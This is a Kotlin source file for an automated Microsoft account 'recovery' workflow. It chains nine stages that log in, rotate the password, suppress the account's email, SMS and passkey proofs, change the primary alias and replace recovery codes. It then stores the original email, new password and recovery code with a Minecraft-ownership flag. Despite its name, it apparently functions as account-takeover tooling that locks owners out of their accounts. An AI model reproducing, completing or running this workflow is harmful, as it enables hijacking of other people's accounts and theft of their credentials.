package microsoft.recovery

import database.model.RecoveredAccount
import database.repository.AccountRepository
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.plugins.cookies.AcceptAllCookiesStorage
import io.ktor.http.Url
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import microsoft.recovery.alias.MfaRequiredException
import microsoft.recovery.alias.SessionExpiredException
import microsoft.recovery.context.RecoveryContext
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.SessionData
import microsoft.recovery.model.StageExecution
import microsoft.recovery.stages.RecoveryStageHandler
import microsoft.recovery.stages.StageListener
import microsoft.recovery.util.MicrosoftHttpClientFactory
import microsoft.recovery.util.RecoveryParsers
import org.slf4j.LoggerFactory

class RecoveryWorkflow(
    private val stage1: RecoveryStageHandler,
    private val stage2: RecoveryStageHandler,
    private val stage3: RecoveryStageHandler,
    private val stage4: RecoveryStageHandler,
    private val stage5: RecoveryStageHandler,
    private val stage6: RecoveryStageHandler,
    private val stage7: RecoveryStageHandler,
    private val stage8: RecoveryStageHandler,
    private val stage9: RecoveryStageHandler,
    private val accountRepository: AccountRepository? = null,
    private val stageDelayMs: Long = 1000L,
    private val stopAfterStage7: Boolean = false,
    private val clientEngine: HttpClientEngine? = null,
) {

    private val logger = LoggerFactory.getLogger(RecoveryWorkflow::class.java)

    suspend fun execute(
        context: RecoveryContext,
        stageListener: StageListener? = null,
    ): RecoveryResult {
        val stage1Result = stage1.execute(context, stageListener)
        if (stage1Result is StageExecution.Failure) return stage1Result.result

        val stage2Result = stage2.execute(context, stageListener)
        if (stage2Result is StageExecution.Failure) return stage2Result.result

        delay(2500L)

        val stage3Result = stage3.execute(context, stageListener)
        if (stage3Result is StageExecution.Failure) return stage3Result.result

        val stage4Result = stage4.execute(context, stageListener)
        if (stage4Result is StageExecution.Failure) return stage4Result.result

        context.proofsData?.let { proofs ->
            if (context.emailProofs.isEmpty()) context.emailProofs = proofs.emailProofs
            if (context.smsProofs.isEmpty()) context.smsProofs = proofs.smsProofs
            if (context.passKeyIds.isEmpty()) context.passKeyIds = proofs.passKeyIds
        }

        val stage5Result = stage5.execute(context, stageListener)
        if (stage5Result is StageExecution.Failure) return stage5Result.result

        val stage6Result = stage6.execute(context, stageListener)
        if (stage6Result is StageExecution.Failure) return stage6Result.result

        if (stageDelayMs > 0) delay(stageDelayMs)

        val stage7Result = stage7.execute(context, stageListener)
        if (stage7Result is StageExecution.Failure) return stage7Result.result

        if (stopAfterStage7) {
            logger.info("Debug mode: stopping after Stage 7 and marking {} as SUCCESS", context.email)
            context.targetAliasEmail = context.email
        } else {
            if (stageDelayMs > 0) delay(stageDelayMs)

            val refreshOk = refreshSession(context, stageListener)
            var reloginAttempted = false
            var reloginSucceeded = false

            if (!refreshOk && context.reloginOtpProvider != null) {
                logger.warn("Session refresh before Stage 8 did not succeed for {}. Attempting relogin.", context.email)
                reloginAttempted = true
                val session = reloginWithNewPassword(context, stageListener)
                if (session != null) {
                    applySessionData(context, session)
                    reloginSucceeded = true
                }
            }

            if (reloginAttempted && !reloginSucceeded) {
                logger.warn("Relogin after failed session refresh failed for {}. Marking partial success.", context.email)
                return completePartialSuccess(context, "Session invalidation before Stage 8 (refresh and relogin failed)")
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            var stage8Result = runStage8Safely(context, stageListener)

            val isMfaOrSessionExpired = isMfaOrSessionExpiredFailure(stage8Result)
            if (isMfaOrSessionExpired && !reloginSucceeded && context.reloginOtpProvider != null) {
                logger.warn("Stage 8 failed due to session expiration / MFA for {}. Attempting relogin fallback.", context.email)
                reloginAttempted = true
                val session = reloginWithNewPassword(context, stageListener)
                if (session != null) {
                    applySessionData(context, session)
                    reloginSucceeded = true
                    if (stageDelayMs > 0) delay(stageDelayMs)
                    stage8Result = runStage8Safely(context, stageListener)
                }
            }

            if (stage8Result is StageExecution.Failure && reloginAttempted) {
                logger.warn("Stage 8 failed after relogin for {}. Marking partial success.", context.email)
                return completePartialSuccess(context, stage8Result.result.message)
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val proofs = context.proofsData
            if (context.passKeyIds.isEmpty() && proofs != null) context.passKeyIds = proofs.passKeyIds
            if (context.emailProofs.isEmpty() && proofs != null) context.emailProofs = proofs.emailProofs
            if (context.smsProofs.isEmpty() && proofs != null) context.smsProofs = proofs.smsProofs

            val stage9Result = stage9.execute(context, stageListener)

            if (stage8Result is StageExecution.Failure) {
                if (stage9Result is StageExecution.Failure) {
                    logger.warn("Stage 9 cleanup also failed after Stage 8 failure: {}", stage9Result.result.message)
                }
                return stage8Result.result
            }

            if (stage9Result is StageExecution.Failure) {
                if (stage9Result.result.cause is MfaRequiredException) {
                    logger.warn("Stage 9 cleanup encountered MFA requirement for {}. Marking partial success.", context.email)
                    return completePartialSuccess(context, stage9Result.result.message)
                }
                return stage9Result.result
            }
        }

        accountRepository?.let { repo ->
            try {
                repo.saveAccount(
                    RecoveredAccount(
                        originalEmail = context.email,
                        currentPrimaryEmail = context.targetAliasEmail,
                        password = context.newPassword,
                        recoveryCode = context.finalRecoveryCode,
                        ownsMinecraft = false,
                        status = RecoveredAccount.STATUS_SUCCESS,
                    ),
                )
            } catch (err: Exception) {
                if (err is CancellationException) throw err
                logger.error("Failed to save recovered account for {}: {}", context.email, err.message, err)
            }
        }

        return RecoveryResult.Success(
            originalEmail = context.email,
            newPrimaryEmail = context.targetAliasEmail,
            password = context.newPassword,
            initialRecoveryCode = context.initialRecoveryCode.orEmpty(),
            finalRecoveryCode = context.finalRecoveryCode.orEmpty(),
            suppressedProofsCount = context.suppressedCount,
            isPartial = false,
        )
    }

    suspend fun refreshSession(
        context: RecoveryContext,
        stageListener: StageListener? = null,
    ): Boolean {
        logger.info("Executing session refresh (post-Stage 6 Polish) for {}", context.email)
        val result = stage3.execute(context) { stageId, stageName, isSuccess, details ->
            if (stageId == "3-debug") {
                stageListener?.invoke("6-debug", "Session Refresh Debug", isSuccess, details)
            } else {
                stageListener?.invoke("6b", "Session Refresh", isSuccess, details)
            }
        }
        return when (result) {
            is StageExecution.Success -> {
                logger.info("Session refresh successfully updated AMRPSSecAuth for {}", context.email)
                true
            }
            is StageExecution.Failure -> {
                logger.warn("Session refresh failed for {}: {}", context.email, result.result.message)
                false
            }
        }
    }

    suspend fun reloginWithNewPassword(
        context: RecoveryContext,
        stageListener: StageListener? = null,
    ): SessionData? {
        val reloginOtp = context.reloginOtpProvider ?: context.otpProvider
        if (reloginOtp == null) {
            logger.warn("No OTP provider available for relogin for {}", context.email)
            return null
        }

        logger.info("Executing relogin with clean session for {}", context.email)
        val newStorage = AcceptAllCookiesStorage()
        val newClient = if (clientEngine != null) {
            MicrosoftHttpClientFactory.create(storage = newStorage, engine = clientEngine)
        } else {
            MicrosoftHttpClientFactory.create(storage = newStorage)
        }

        val newUaid = RecoveryParsers.generateUaid()
        val reloginContext = RecoveryContext(
            email = context.email,
            newPassword = context.newPassword,
            newEmail = context.newEmail,
            uaid = newUaid,
            cookieStorage = newStorage,
            httpClient = newClient,
            otpProvider = reloginOtp,
            aliasOtcProvider = context.aliasOtcProvider,
            reloginOtpProvider = context.reloginOtpProvider,
        )

        try {
            val stage1Result = stage1.execute(reloginContext) { key, name, ok, detail ->
                stageListener?.invoke("relogin-$key", "Relogin $name", ok, detail)
            }
            if (stage1Result is StageExecution.Failure) {
                logger.warn("Relogin Stage 1 failed for {}: {}", context.email, stage1Result.result.message)
                newClient.close()
                return null
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val stage2Result = stage2.execute(reloginContext) { key, name, ok, detail ->
                stageListener?.invoke("relogin-$key", "Relogin $name", ok, detail)
            }
            if (stage2Result is StageExecution.Failure) {
                logger.warn("Relogin Stage 2 failed for {}: {}", context.email, stage2Result.result.message)
                newClient.close()
                return null
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val stage3Result = stage3.execute(reloginContext) { key, name, ok, detail ->
                stageListener?.invoke("relogin-$key", "Relogin $name", ok, detail)
            }
            if (stage3Result is StageExecution.Failure) {
                logger.warn("Relogin Stage 3 failed for {}: {}", context.email, stage3Result.result.message)
                newClient.close()
                return null
            }

            val accountCookies = newStorage.get(Url("https://account.live.com"))
            val hasSecAuth = accountCookies.any { it.name == "AMRPSSecAuth" }
            if (!hasSecAuth) {
                logger.warn("Relogin succeeded but AMRPSSecAuth missing in cookies for {}", context.email)
                newClient.close()
                return null
            }

            stageListener?.invoke("relogin", "Relogin Session", true, "Fresh session established with new credentials")
            logger.info("Relogin succeeded with new session for {}", context.email)
            return SessionData(
                cookieStorage = newStorage,
                httpClient = newClient,
                uaid = reloginContext.uaid,
                activeCanary = reloginContext.activeCanary,
            )
        } catch (e: CancellationException) {
            newClient.close()
            throw e
        } catch (e: Exception) {
            logger.error("Relogin encountered unexpected exception for {}: {}", context.email, e.message, e)
            newClient.close()
            return null
        }
    }

    private fun applySessionData(context: RecoveryContext, session: SessionData) {
        val oldClient = context.httpClient
        context.cookieStorage = session.cookieStorage
        context.httpClient = session.httpClient
        context.uaid = session.uaid
        if (session.activeCanary.isNotBlank()) {
            context.activeCanary = session.activeCanary
        }
        if (oldClient !== session.httpClient) {
            runCatching { oldClient.close() }
        }
    }

    private fun isMfaOrSessionExpiredFailure(stageExecution: StageExecution<Unit>): Boolean {
        if (stageExecution !is StageExecution.Failure) return false
        val failure = stageExecution.result
        val cause = failure.cause
        if (cause is SessionExpiredException || cause is MfaRequiredException) return true
        val msg = failure.message
        return msg.contains("Session expired", ignoreCase = true) ||
            msg.contains("mfa", ignoreCase = true) ||
            msg.contains("oauth2", ignoreCase = true) ||
            msg.contains("login.microsoftonline.com", ignoreCase = true)
    }

    private suspend fun runStage8Safely(
        context: RecoveryContext,
        stageListener: StageListener?,
    ): StageExecution<Unit> = try {
        stage8.execute(context, stageListener)
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        logger.error("Stage 8 execution failed: {}", e.message, e)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, e.message ?: "Stage 8 error", cause = e))
    }

    private suspend fun completePartialSuccess(
        context: RecoveryContext,
        reason: String,
    ): RecoveryResult {
        context.targetAliasEmail = context.email
        accountRepository?.let { repo ->
            try {
                repo.saveAccount(
                    RecoveredAccount(
                        originalEmail = context.email,
                        currentPrimaryEmail = context.email,
                        password = context.newPassword,
                        recoveryCode = context.finalRecoveryCode,
                        ownsMinecraft = false,
                        status = RecoveredAccount.STATUS_SUCCESS_PARTIAL,
                        failReason = reason,
                    ),
                )
            } catch (err: Exception) {
                if (err is CancellationException) throw err
                logger.error("Failed to save partial recovered account for {}: {}", context.email, err.message, err)
            }
        }
        return RecoveryResult.Success(
            originalEmail = context.email,
            newPrimaryEmail = context.email,
            password = context.newPassword,
            initialRecoveryCode = context.initialRecoveryCode.orEmpty(),
            finalRecoveryCode = context.finalRecoveryCode.orEmpty(),
            suppressedProofsCount = context.suppressedCount,
            message = "Partial success: password rotated, alias unchanged ($reason)",
            isPartial = true,
        )
    }
}
